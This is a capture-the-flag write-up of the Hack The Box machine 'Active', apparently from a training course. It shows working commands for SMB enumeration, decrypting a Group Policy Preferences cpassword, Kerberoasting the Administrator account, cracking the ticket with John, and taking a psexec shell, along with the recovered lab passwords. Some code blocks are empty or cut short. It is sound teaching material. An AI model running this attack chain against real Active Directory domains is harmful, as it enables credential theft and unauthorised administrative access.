# Exercise: Enumerating and exploiting AD on Active

We will have a look at another Active Directory case study. Active involves enumeration of SMB and getting a password from a Group Policy Preferences file Groups.xml. With this, we can enumerate users in Active Directory and using Bloodhound again, identify a user that is Kerberoastable. With that, we get an administrative access on the box.

Running nmap, we find a likely domain controller running Windows Server 2008 R2 SP1.

```bash

```

Running smbmap to explore SMB, we get the following shares:

```bash
┌─[oztechmuse@parrot]─[~/boxes/Active]
└──╼ $smbmap -H active.htb
[+] IP: active.htb:445 Name: unknown
 Disk        Permissions Comment
 ----        ----------- -------
 ADMIN$      NO ACCESS   Remote Admin
 C$          NO ACCESS   Default share

 NETLOGON    NO ACCESS   Logon server share
 Replication READ ONLY
 SYSVOL      NO ACCESS   Logon server share
 Users       NO ACCESS
```

We can use smbmap to recursively list all directories and files using the -R flag. We can do this on the Replication share.

```bash
┌─[rin@parrot]─[~/boxes/Active]
└──╼ $smbmap -H active.htb -R Replication --depth 10

<SNIP>
```

The interesting file here is Groups.xml which is a file that stores Group Policy Preferences which we can retrieve with smbmap:

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Active]
└──╼ $smbmap -H active.htb \

(533 bytes)
[+] File output: <SNIP>
```

Before we go on, we should talk about Group Policy in an Active Directory environment. Group Policy is a management technology that allows centralized control over user and computer security settings. A Group Policy Object is a logical container that consists of a Group Policy container and a Group Policy template. Templates are stored on the System Volume \(SYSVOL\) of each domain controller. Containers are stored in the domain partition of Active Directory. In terms of synchronizing Group Policy Objects to other domain controllers, Active Directory replication is responsible for replicating the containers and File Replication Services \(FRS\) or Distributed File System Replication \(DFSR\) is responsible for replicating the SYSVOL.

Group policy is applied to computers and users by the Group Policy client-side extensions. Group Policy Preferences are client side preferences that are saved for a user and as such are extensions of Group Policy. They determine things like environment variables, drive mappings, folder settings, configured printers, start menu, etc. Passwords used to be able to be stored in Group Policy Preference files and these were encrypted using a key that has subsequently become widely available after Microsoft publicly disclosed it \(https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be\).

Looking at the Groups.xml file, we see

```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">

       name="active.htb\SVC_TGS" image="2" 
       changed="2018-07-18 20:46:06" 
       uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
 <Properties action="U" newName="" fullName="" 
             description="" 
             cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+
             ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
             changeLogon="0" noChange="1" neverExpires="1" 
             acctDisabled="0" userName="active.htb\SVC_TGS"/>
 </User>
</Groups>
```

The file contains a password hash \(cpassword\) for the user SVC\_TGS. You can decrypt this using a utility gpp-decrypt.py \(https://github.com/t0thkr1s/gpp-decrypt/blob/master/gpp-decrypt.py\) or by using cryptii.com as shown below.

![Graphical user interface, application, Teams

Description automatically generated](../.gitbook/assets/2%20%287%29.png)

Decrypting the cpasssword from Groups.xml. The text is base64 decoded and then decrypted using AES-256 using the published key.

This gives us the password for svc\_tgs of GPPstillStandingStrong2k18 \(a commentary on the vulnerability that still existed in 2018\). We now have read access to the Users directory and can get the user flag in c:\Users\SVC\_TGS\Desktop\users.txt by using smbclient.

```bash
┌─[rin@parrot]─[~/boxes/Active]
└──╼ $smbmap -H active.htb -u 'svc_tgs' -p GPPstillStandingStrong2k18

We can see from the home directories that there are likely at least 2 users: SVC\_TGS and Administrator. We can enumerate the AD users using ldapsearch:

```bash
┌─[rin@parrot]─[~/boxes/Active]
└──╼ $ldapsearch -h active.htb -x -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' \
-b "dc=active,dc=htb" "(&(objectClass=user)(!(objectClass=computer)))" \
samaccountname | grep -i samaccountname
# requesting: samaccountname

sAMAccountName: Guest
sAMAccountName: krbtgt
sAMAccountName: SVC_TGS
and GetADUsers.py
┌─[rin@parrot]─[~/boxes/Active]
└──╼ $GetADUsers.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -all

```

Both of these approaches show that we have the three manin users we are interested in SVC\_TGS, Administrator and krbtgt, the Kerberos user. We can again explore AD using BloodHound. This time, we will do it from Windows. The instructions for installation on Windows are on the BloodHound documents site \(https://bloodhound.readthedocs.io/en/latest/installation/windows.html\). To collect the data, we will use SharpHound.exe and we can run that from a command prompt that has authenticated with the domain. We can add active.htb as a hosts entry in the hosts file at c:\Windows\System32\drivers\etc\hosts.

From a command prompt, run a cmd.exe using the command:

```bash
C:\> runas /netonly /user:active.htb\svc_tgs cmd.exe
```

Enter the password for the user when prompted. This will open a separate window with the title saying that cmd,exe \(running as active.htb\svc\_tgs\). You can verify that this is running correctly by listing the Users directory. If all has worke correctly, you will not be prompted for a username or password:

```bash
c:\Users\rin\boxes\Active>dir \\10.129.81.55\Users
 Volume in drive \\10.129.81.55\Users has no label.
 Volume Serial Number is 2AF3-72E4

07/21/2018 10:39 PM <DIR> ..
07/16/2018 06:14 PM <DIR> Administrator

 0 File(s) 0 bytes
 5 Dir(s) 20,165,267,456 bytes free
```

From this cmd prompt, we can run SharpHound to get a set of JSON files that are in a ZIP file.

```bash
c:\Users\rin\boxes\Active>.\SharpHound.exe -d active.htb

```

Once this is done, we can launch BloodHound, upload the zip file and then run queries to explore the domain. If we run the query, List all Kerberoastable Accounts, we find that Administrator is kerberoastable. This means that the account has an associated SPN \(Service Principle Name\).

![Kerberoastable users in the Active.htb domain](../.gitbook/assets/3%20%288%29.png)

Another way of doing this is to run the Impacket tool GetUserSPNs. This will do an LDAP query to retrieve the SPNs for any active user accounts and once it has obtained them, will request a service ticket from the TGS for the SPN.

```bash
┌─[rin@parrot]─[~/boxes/Active]
└──╼ $GetUserSPNs.py -request active.htb/svc_tgs:GPPstillStandingStrong2k18

...<SNIP>
```

As Administrator had an SPN which was "active/CIFS:445" we got a service ticket that we can now try and crack with John The Ripper:

```bash
┌─[rin@parrot]─[~/boxes/Active]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8

Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
```

That gives us a password Ticketmaster1968 which we can use with psexec.py to get remote command shell on the box.

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Active]
└──╼ $psexec.py active.htb/Administrator:Ticketmaster1968@10.129.26.7

You can find users with SPNs using an ldapsearch:

```bash
┌─[rin@parrot]─[~/boxes/Active]
└──╼ $ldapsearch -h active.htb -x -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' \
-b "dc=active,dc=htb" \
"(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512) \
(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))" \
sAMAccountName ServicePrincipalName | \
grep 'sAMAccountName:\|servicePrincipalName:'
sAMAccountName: Administrator
servicePrincipalName: active/CIFS:445
```

The interesting thing about the query is the use of the userAccountControl attribute which is a bit mask that has multiple values \(http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm\). In this case, the query is checking that the account is not disabled \(2\) and that it is a normal account \(512\). The userAccountControl attribute can also be queried to check whether the account does not require preauth \(4194304\).
